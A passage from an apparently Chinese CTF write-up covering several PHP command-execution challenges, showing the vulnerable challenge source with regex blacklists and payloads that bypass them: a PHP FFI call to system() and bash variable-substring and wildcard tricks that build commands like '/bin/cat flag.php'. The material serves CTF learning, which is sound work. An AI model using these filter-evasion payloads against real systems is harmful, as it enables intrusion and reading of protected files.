            sizes="auto"
            alt="image-20230707171534209">
    </a></figure></p>
<p>前面的套路失效了，根据提示使用PHP7.4以上才有的FFI进行命令执行</p>
<blockquote>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
</blockquote>
<p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span><span class="o">=$</span><span class="n">ffi</span> <span class="o">=</span> <span class="n">FFI</span><span class="p">::</span><span class="n">cdef</span><span class="p">(</span><span class="s2">&#34;int system(const char *command);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;/readflag &gt; 1.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">ffi</span><span class="o">-&gt;</span><span class="n">system</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随后我们访问1.txt即可得到flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png" title="image-20230707171955622" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png 2x"
            sizes="auto"
            alt="image-20230707171955622">
    </a></figure></p>
<h3 id="web118" class="headerLink">
    <a href="#web118" class="header-mark"></a>[web118]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;zh-cn&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;width:400px;height:10px;margin:100px auto&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#39;&#39;</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text&#39;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;code&#39;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;给你打开一扇通往结界的窗户，可惜钥匙你是找不到的 &#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">		<span class="c">&lt;!-- system($code);--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>题目的描述告诉我们flag在flag.php里面</p>
<p>题目环境的前端提示我们输入的命令会被执行，但经过尝试ls等命令是被ban掉的</p>
<p><strong>bash的内置变量进行绕过</strong></p>
<p>$PWD用法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">PWD和</span><span class="o">$</span><span class="p">{</span><span class="n">PWD</span><span class="p">}</span>    <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>  <span class="err">结果一样</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="p">{</span><span class="c1">#PWD}         13    $PWD的长度</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="p">{</span><span class="n">PWD</span><span class="p">:</span><span class="mi">3</span><span class="p">}</span>        <span class="n">r</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>   
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="p">{</span><span class="n">PWD</span><span class="p">:</span><span class="o">~</span><span class="mi">3</span><span class="p">}</span>    	<span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="p">{</span><span class="n">PWD</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span>     	<span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="p">{</span><span class="n">PWD</span><span class="p">:</span><span class="o">~</span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span> 	<span class="n">h</span>	
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="p">{</span><span class="n">SHLVL</span><span class="p">:</span><span class="o">~</span><span class="n">A</span><span class="p">}</span> 	<span class="mi">1</span>	    <span class="n">A是字符串</span> <span class="err">转换为数字相当于</span><span class="mi">0</span>   
</span></span></code></pre></td></tr></table>
</div>
</div><p>拼接出nl：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">n:
</span></span><span class="line"><span class="cl">${PATH:~A}  	n #如果$PATH结尾为n
</span></span><span class="line"><span class="cl">${PATH:${#TERM}:${SHLVL:~A}}   # n   相当于${PATH:14:1}
</span></span><span class="line"><span class="cl">l:
</span></span><span class="line"><span class="cl">${#RANDOM}  # 4或者5
</span></span><span class="line"><span class="cl">${PATH:${#RANDOM}:${#SHLVL:~A}}  #l
</span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd</a></p>
<p>构造payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${PATH:~A}${PWD:~A}$IFS????.???
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="sr">//</span><span class="err">也就是</span>  <span class="n">nl</span> <span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web119" class="headerLink">
    <a href="#web119" class="header-mark"></a>[web119]</h3><p>跟上题一样，不过<code>PATH</code>被ban了。</p>
<p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时<code>${SHLVL}=1</code>，然后在此shell中再打开一个shell时<code>$SHLVL=2</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="si">${</span><span class="nv">SHLVL</span><span class="si">}</span>       //一般是一个个位数
</span></span><span class="line"><span class="cl"><span class="si">${#</span><span class="nv">SHLVL</span><span class="si">}</span>     //1，表示结果的字符长度
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">PWD</span><span class="p">:</span><span class="si">${#}</span><span class="p">:</span><span class="si">${#</span><span class="nv">SHLVL</span><span class="si">}}</span>       //表示/
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">USER</span><span class="si">}</span>        //www-data
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">PHP_VERSION</span><span class="p">:~A</span><span class="si">}</span>       //2
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">USER</span><span class="p">:~</span><span class="si">${</span><span class="nv">PHP_VERSION</span><span class="p">:~A</span><span class="si">}</span><span class="p">:</span><span class="si">${</span><span class="nv">PHP_VERSION</span><span class="p">:~A</span><span class="si">}}</span>         //at
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>${PHP_VERSION:~A}</code>来自于返回报文的头部，为<code>2</code>：</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png" title="image-20230707175243025" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png 2x"
            sizes="auto"
            alt="image-20230707175243025">
    </a></figure></p>
<p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//也就是：/???/?at ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web120" class="headerLink">
    <a href="#web120" class="header-mark"></a>[web120]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>限制的$code的长度</p>
<p>把<code>${#}</code>省略</p>
<p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以用<code>/bin/base64 flag.php</code></p>
<p>即payload：(<code>$RANDOM</code> 的范围是 [0, 32767])</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web121" class="headerLink">
    <a href="#web121" class="header-mark"></a>[web121]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><code>rev</code>命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。</p>
</blockquote>
<p>尝试构造命令：<code>/bin/rev flag.php</code></p>
<blockquote>
<p><code>${#IFS}</code>在ubuntu等系统中值为3，在kali中测试值为<code>4</code>
<code>${#}</code>为添加到shell的参数个数，<code>${##}</code>则为值1</p>
</blockquote>
<p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到的flag值放在Linux里面rev一下就可以了</p>
<blockquote>
<p>另外</p>
<p><code>$?</code>表示上次命令的执行返回码，<code>0</code>表示正常，其他都是不正常。</p>
<p>所以我们可以有如下payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
</span></span></code></pre></td></tr></table>
</div>
</div></blockquote>
<h3 id="web122" class="headerLink">
    <a href="#web122" class="header-mark"></a>[web122]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>比121又过滤了<code>PWD</code>和<code>$</code></p>
<p>利用<code>&lt;A</code>的报错就能返回值1。
这一题借用<code>${HOME}</code>的第一位为<code>/</code>：payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><p>（多执行几次）</p>
<h3 id="web124" class="headerLink">
    <a href="#web124" class="header-mark"></a>[web124]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: 收集自网络
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-10-06 14:04:45
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//例子 c=20-1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;太长了不会算&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
